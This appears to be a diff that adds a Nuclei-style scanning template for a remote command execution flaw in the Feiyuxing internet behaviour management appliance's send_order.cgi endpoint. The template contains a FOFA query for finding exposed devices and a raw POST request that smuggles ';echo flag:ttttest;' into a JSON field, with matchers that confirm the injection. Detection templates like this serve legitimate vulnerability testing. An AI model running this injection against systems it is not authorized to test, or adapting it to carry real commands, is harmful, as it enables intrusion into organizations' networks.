@@ -1,0 +1,47 @@
+id: feiyuxingzhinengshangwangxingweiguanlixit-send_order-rce
+
+info:
+  name: 飞鱼星智能上网行为管理系统send_order接口存在远程命令执行
+  author: candada
+  severity: critical
+  description: '飞鱼星智能上网行为管理系统专为中小企业、政府机关、教育及科研机构等用户设计，是具备“ 上网行为管理”、“多WAN路由器”以及“VPN网关”等多重功能的新一代硬件网络接入设备。，飞鱼星智能上网行为管理系统send_order接口存在远程命令执行漏。'
+  reference:
+    - https://mp.weixin.qq.com/s/pe7MhDaUoljO1mixxa4C9Q
+  tags: 2024,飞鱼星,rce
+  metadata:
+    fofa-query: title="飞鱼星企业"
+  classification:
+    cvss-metrics: 
+    cvss-score:                                                   
+    cve-id:                                              
+    cwe-id:                                                    
+    epss-score:                                              
+    epss-percentile:                                           
+    cpe:   
+http:
+  - raw:
+      - |+
+        POST /send_order.cgi?parameter=operation HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Host: {{Hostname}}
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 59
+
+        {"opid":"1","name":";echo flag:ttttest;","type":"rest"}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - ttttest
+      - type: status
+        status:
+          - 200
